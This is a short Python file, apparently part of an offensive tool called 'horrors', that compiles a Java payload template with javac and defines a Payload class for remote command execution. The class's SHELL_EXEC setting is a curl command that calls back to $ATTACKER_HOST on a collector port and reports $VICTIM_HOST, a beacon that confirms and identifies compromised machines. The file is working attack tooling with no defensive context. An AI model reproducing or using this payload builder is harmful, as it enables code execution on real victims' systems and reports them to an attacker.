import os
import pathlib
import shlex
import subprocess
import tempfile

from horrors import (
    logging,
    templates,
)


class CompiledJavaPayload(templates.Template):

    def preprocess(self, template):
        with tempfile.TemporaryDirectory() as tmp_dir:
            tmp_src = pathlib.Path(tmp_dir, 'Payload.java')
            tmp_bin = pathlib.Path(tmp_dir, 'Payload.class')
            with open(tmp_src, 'w') as fil:
                fil.write(template)
            cmd = self.config.COMPILER_JAVAC + ' ' + str(tmp_src)
            subprocess.run(shlex.split(cmd))
            print('Compiled ' + str(tmp_bin))
            with open(tmp_bin, 'rb') as fil:
                template = fil.read()
        return template


class Payload(CompiledJavaPayload):

    template_path = 'templates/RuntimeExec.java.tpl'
    template_context = {
        'SHELL_EXEC': 'curl http://$ATTACKER_HOST:$COLLECTOR_PORT/collect/?id=$VICTIM_HOST',
    }
